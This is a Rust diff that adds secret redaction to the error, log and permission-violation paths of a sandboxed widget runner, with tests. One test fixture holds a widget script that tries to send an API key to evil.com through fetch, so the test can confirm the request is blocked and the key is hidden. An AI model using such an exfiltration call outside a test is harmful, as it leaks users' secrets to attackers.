@@ -114,9 +114,11 @@ pub const WIDGET_LOG_TARGET: &str = "perchbar::widget";
 
 /// Cuts an error message to `ERROR_MAX_CHARS` characters, the last one an
 /// ellipsis, and blanks control characters, so a widget cannot flood or
-/// forge log lines or tooltips.
-fn clip(msg: impl Into<String>) -> String {
-    let msg = host::without_controls(&msg.into());
+/// forge log lines or tooltips. Secret values are replaced first, so the cut
+/// can never leave part of one, and again after blanking, in case that
+/// formed one.
+fn clip(redactor: &Redactor, msg: impl Into<String>) -> String {
+    let msg = redactor.apply(&host::without_controls(&redactor.apply(&msg.into())));
     if msg.chars().count() <= ERROR_MAX_CHARS {
         return msg;
     }
@@ -128,8 +130,9 @@ fn clip(msg: impl Into<String>) -> String {
 /// Runs `widget.js` once in a fresh runtime and returns its parsed output.
 /// Storage changes are saved even when the run fails or times out.
 pub async fn run(ctx: RunContext) -> Result<Output, RunError> {
-    let source = std::fs::read_to_string(ctx.widget_dir.join("widget.js"))
-        .map_err(|e| RunError::Script(clip(format!("cannot read widget.js: {e}"))))?;
+    let source = std::fs::read_to_string(ctx.widget_dir.join("widget.js")).map_err(|e| {
+        RunError::Script(clip(&ctx.redactor, format!("cannot read widget.js: {e}")))
+    })?;
     let storage = Arc::new(Mutex::new(host::Storage::load(ctx.storage_path.clone())));
     let limits = ctx.limits;
     let violation = Arc::new(Mutex::new(None));
@@ -150,8 +153,12 @@ pub async fn run(ctx: RunContext) -> Result<Output, RunError> {
         return Err(RunError::Script("output too large".into()));
     }
     let value: Value =
-        serde_json::from_str(&json).map_err(|e| RunError::BadOutput(clip(e.to_string())))?;
-    crate::display::parse(value).map_err(|e| RunError::BadOutput(clip(e.to_string())))
+        serde_json::from_str(&json).map_err(|e| bad_output(&ctx.redactor, e.to_string()))?;
+    crate::display::parse(value).map_err(|e| bad_output(&ctx.redactor, e.to_string()))
+}
+
+fn bad_output(redactor: &Redactor, msg: String) -> RunError {
+    RunError::BadOutput(clip(redactor, msg))
 }
 
 /// Evaluates the prelude and widget in a fresh runtime + context; returns the
@@ -162,7 +169,7 @@ async fn execute(
     storage: Arc<Mutex<host::Storage>>,
     violation: Violation,
 ) -> Result<Option<String>, RunError> {
-    let script_err = |e: rquickjs::Error| RunError::Script(clip(e.to_string()));
+    let script_err = |e: rquickjs::Error| RunError::Script(clip(&ctx.redactor, e.to_string()));
     let rt = AsyncRuntime::new().map_err(script_err)?;
     rt.set_memory_limit(ctx.limits.memory_bytes).await;
     let interrupted = Arc::new(AtomicBool::new(false));
@@ -188,7 +195,7 @@ async fn execute(
     js.async_with(async move |ctx| {
         let result: rquickjs::Result<Option<String>> = async {
             install_fetch(&ctx, http, allowed, seen, redactor.clone())?;
-            host::install(&ctx, storage, instance_id, logbook, redactor)?;
+            host::install(&ctx, storage, instance_id, logbook, redactor.clone())?;
             let invoke: Function = ctx.eval(PRELUDE)?;
             let (module, loaded) = Module::declare(ctx.clone(), "widget.js", source)?.eval()?;
             loaded.into_future::<()>().await?;
@@ -197,7 +204,7 @@ async fn execute(
             pending.into_future::<Option<String>>().await
         }
         .await;
-        result.map_err(|e| classify(&ctx, e, &interrupted, &violation))
+        result.map_err(|e| classify(&ctx, e, &interrupted, &violation, &redactor))
     })
     .await
 }
@@ -208,11 +215,12 @@ fn classify(
     err: rquickjs::Error,
     interrupted: &AtomicBool,
     violation: &Violation,
+    redactor: &Redactor,
 ) -> RunError {
     if matches!(err, rquickjs::Error::Allocation) {
         return RunError::OutOfMemory;
     }
-    let message = CaughtError::from_error(ctx, err).to_string();
+    let message = redactor.apply(&CaughtError::from_error(ctx, err).to_string());
     if interrupted.load(Ordering::Relaxed) {
         RunError::Timeout
     } else if message.contains("out of memory") {
@@ -223,9 +231,9 @@ fn classify(
         .as_ref()
         .filter(|v| message.contains(*v))
     {
-        RunError::Permission(clip(v.clone()))
+        RunError::Permission(clip(redactor, v.clone()))
     } else {
-        RunError::Script(clip(message))
+        RunError::Script(clip(redactor, message))
     }
 }
 
@@ -273,7 +281,10 @@ fn install_fetch<'js>(
                 let resp = match send(http.as_ref(), req, &allowed).await {
                     Ok(resp) => resp,
                     Err(SendError::Denied(msg)) => {
-                        log::warn!("blocked widget request: {}", redactor.apply(&msg));
+                        // The URL may hold a secret: hide it before the
+                        // message is logged, stored or thrown.
+                        let msg = redactor.apply(&msg);
+                        log::warn!("blocked widget request: {msg}");
                         *violation.lock().unwrap() = Some(msg.clone());
                         return Err(Exception::throw_type(&ctx, &msg));
                     }
@@ -703,6 +714,57 @@ mod tests {
                 (LogLevel::Error, "e".to_string()),
             ]
         );
+    }
+
+    #[tokio::test]
+    async fn run_errors_are_redacted_before_the_clip() {
+        const SECRET: &str = "sk-1234567890";
+        let mut straddled = false;
+        // Slide the secret across the 300-char cut.
+        for pad in 280..300 {
+            let mut f = Fixture::new(&format!(
+                "export default async function update({{ settings }}) {{\n\
+                 throw new Error(\"x\".repeat({pad}) + settings.apiKey);\n}}"
+            ));
+            f.settings.insert("apiKey".into(), json!(SECRET));
+            f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
+            let m = match f.run().await {
+                Err(RunError::Script(m)) => m,
+                other => panic!("expected a script error, got {other:?}"),
+            };
+            assert!(!m.contains(&SECRET[..4]), "pad {pad}: {m}");
+            straddled |= m.contains("[sec") && !m.contains("[secret]");
+        }
+        assert!(straddled, "no offset put the secret across the cut");
+    }
+
+    #[tokio::test]
+    async fn bad_output_and_violations_are_redacted() {
+        const SECRET: &str = "sk-1234567890";
+        let mut f = Fixture::new(
+            "export default async function update({ settings }) {\n\
+             return { blocks: [{ type: settings.apiKey }] };\n}",
+        );
+        f.settings.insert("apiKey".into(), json!(SECRET));
+        f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
+        match f.run().await {
+            Err(RunError::BadOutput(m)) => assert!(!m.contains(&SECRET[..4]), "{m}"),
+            other => panic!("expected bad output, got {other:?}"),
+        }
+
+        let mut f = Fixture::new(
+            "export default async function update({ settings }) {\n\
+             await fetch(\"https://evil.com/?k=\" + settings.apiKey);\n}",
+        );
+        f.settings.insert("apiKey".into(), json!(SECRET));
+        f.redactor = Arc::new(Redactor::new([SECRET.to_string()]));
+        match f.run().await {
+            Err(RunError::Permission(m)) => {
+                assert!(!m.contains(&SECRET[..4]), "{m}");
+                assert!(m.contains("evil.com"), "{m}");
+            }
+            other => panic!("expected a permission error, got {other:?}"),
+        }
     }
 
     #[tokio::test]
